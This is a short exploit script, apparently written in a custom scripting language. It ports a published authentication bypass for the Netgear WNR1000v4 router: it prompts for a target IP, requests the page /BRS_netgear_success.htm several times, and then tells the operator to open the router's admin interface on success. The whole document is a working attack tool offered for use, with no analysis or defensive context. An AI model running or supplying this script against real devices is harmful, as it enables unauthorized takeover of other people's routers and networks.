/**
* Title: Netgear WNR1000v4 - Authentication Bypass
* Discovered by: Daniel Haake
* Exploit from https://www.exploit-db.com/exploits/39356/
*/

load "http/curl"

print "Netgear WNR1000v4 Authentication Bypass\n"

print "IP Target: "
input.start()
    @target = input.value
    @exploit = "/BRS_netgear_success.htm"
    for(@i = 1| @i <= 3| @i++)
        @result = curl.get(@target, @exploit)
    end
    
    if(preg_match("/401 Unauthorized/", @result))
    print "Password Protection, Exploit Failed!"
    end
    
    if(preg_match("/200 OK/", @result))
    print "Bypass success, open your web browser and access ".@target
    else
    print "Failed bypass, try again"
    end
input.close()
